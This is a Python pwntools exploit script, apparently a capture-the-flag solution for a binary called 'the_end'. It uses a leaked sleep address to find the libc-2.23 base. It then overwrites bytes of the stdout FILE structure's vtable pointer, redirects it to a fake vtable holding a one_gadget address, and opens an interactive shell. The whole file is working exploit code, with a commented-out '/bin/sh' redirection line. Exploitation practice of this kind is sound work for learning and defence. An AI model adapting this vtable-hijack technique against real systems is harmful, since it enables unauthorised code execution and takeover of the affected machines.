from pwn import *
context.log_level="debug"

libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p = process('./the_end')
#gdb.attach(p)
sleep_ad = p.recvuntil(', good luck',drop=True).split(' ')[-1]
libc_base = long(sleep_ad,16) - libc.symbols['sleep']
log.success("libc base address:" + hex(libc_base))
one_gadget = libc_base + 0xf02b0 # 0xf02a4 #0xf1147 #0x4526a  #0xf1147 # 0x45216
system = libc_base + libc.symbols['system']
io_stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
vtable_addr = io_stdout + 0xd8
target_addr = io_stdout + 0xa0
fake_vtable = target_addr - 0x58 
log.info("io_stdout at " + hex(io_stdout))
log.info("fake_vtable at " + hex(fake_vtable))
log.info("gadget at " + hex(one_gadget))
# vtable_addr -> fake_vtable
for i in range(2):
    p.send(p64(vtable_addr + i))
    p.send(p64(fake_vtable)[i])

#raw_input()
# taget -> one_gadget
for i in range(3):
    p.send(p64(target_addr + i))
    p.send(p64(one_gadget)[i])

#raw_input()
#p.sendline("exec /bin/sh 1>&0")
p.interactive()

